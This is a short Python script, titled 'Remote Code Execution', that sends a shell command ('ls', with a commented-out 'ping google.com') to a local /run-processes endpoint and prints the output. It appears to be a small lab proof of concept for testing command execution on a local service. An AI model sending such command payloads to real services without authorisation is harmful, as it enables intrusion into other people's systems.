# Remote Code Execution
import requests

url = 'http://127.0.0.1:8080/run-processes'
# my_obj = {"process": 'ping google.com'}
my_obj = {"process": 'ls'}

print(my_obj)
print(requests.post(url, data=my_obj).text)
